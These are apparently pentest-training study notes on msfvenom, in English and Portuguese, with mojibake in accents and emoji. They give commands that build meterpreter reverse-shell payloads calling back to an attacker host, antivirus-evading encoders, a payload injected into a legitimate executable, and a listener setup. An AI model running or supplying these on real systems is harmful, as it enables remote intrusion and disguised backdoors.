#+title: Msfvenom
#+author: gabriel

* intro
msfvenom is a command line utility that can be used to generate and encode MSF payloads for various operating systems as well as web servers

msfvenom is a combination of two utilities, namely msfpayload and msfencode

we can use msfvenom to generate malicious meterpreter payload that can be transferred to a client target system. once executed, it will connect back to our payload handler and provide us with remote access to the target system

O MSFVenom √© a combina√ß√£o do antigo /msfpayload/ e /msfencode/. √â a ferramenta padr√£o do Metasploit para gerar payloads, permitindo a cria√ß√£o de execut√°veis, scripts e shellcodes para diversas plataformas (Windows, Linux, Android, etc.).

* üõ†Ô∏è Estrutura do Comando e Sintaxe
A constru√ß√£o de um comando msfvenom segue um padr√£o l√≥gico de op√ß√µes:

| Flag | Descri√ß√£o | Exemplo |
|------+-----------+---------|
| *-p* | Payload selecionado | windows/x64/meterpreter/reverse_tcp |
| *LHOST* | IP do atacante (sua m√°quina) | 192.168.1.10 |
| *LPORT* | Porta de escuta | 4444 |
| *-f* | Formato de sa√≠da | exe, elf, raw, msi, vba |
| *-e* | Encoder para ofusca√ß√£o | x86/shikata_ga_nai |
| *-i* | N√∫mero de itera√ß√µes do encoder | 3 |
| *-o* | Arquivo de sa√≠da | shell.exe |

* üöÄ Exemplos Pr√°ticos por Plataforma

** Windows (Execut√°vel)
Ideal para ataques de engenharia social ou eleva√ß√£o de privil√©gios ap√≥s um bypass de UAC.
#+BEGIN_SRC bash
# Payload Staged (Usa /)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o backdoor.exe
#+END_SRC

** Linux (ELF)
√ötil para servidores Linux ou sistemas integrados (IoT).
#+BEGIN_SRC bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf
#+END_SRC

** Web (PHP/ASPX)
Para explora√ß√£o de vulnerabilidades como *Unrestricted File Upload*.
#+BEGIN_SRC bash
# PHP Web Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php
#+END_SRC

* üïµÔ∏è Ofusca√ß√£o e Evas√£o
A encodifica√ß√£o ajuda a evitar assinaturas est√°ticas de antiv√≠rus b√°sicos, embora IDSs modernos exijam t√©cnicas mais avan√ßadas.

** Usando Encoders
#+BEGIN_SRC bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded.exe
#+END_SRC

** Inje√ß√£o em Execut√°vel Leg√≠timo (-x)
Permite embutir o payload dentro de um programa real (ex: calc.exe), tornando-o menos suspeito.
#+BEGIN_SRC bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -x /usr/share/windows-binaries/plink.exe -f exe -o plink_malicioso.exe
#+END_SRC

* üìä Listagem de Recursos
Para explorar as capacidades do msfvenom diretamente no seu Zsh:
- =msfvenom -l payloads=: Lista todos os payloads dispon√≠veis.
- =msfvenom -l formats=: Lista os formatos de sa√≠da suportados.
- =msfvenom -l encoders=: Lista os encoders para ofusca√ß√£o.

* üí° Dica de Fluxo (INE Training)
Como visto no seu treinamento, ap√≥s gerar o payload e envi√°-lo via Meterpreter ou Evil-WinRM, certifique-se de que o =multi/handler= no Metasploit est√° configurado com o *mesmo* payload e porta utilizados na gera√ß√£o.

#+BEGIN_SRC msf
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <IP>
set LPORT 4444
run
#+END_SRC
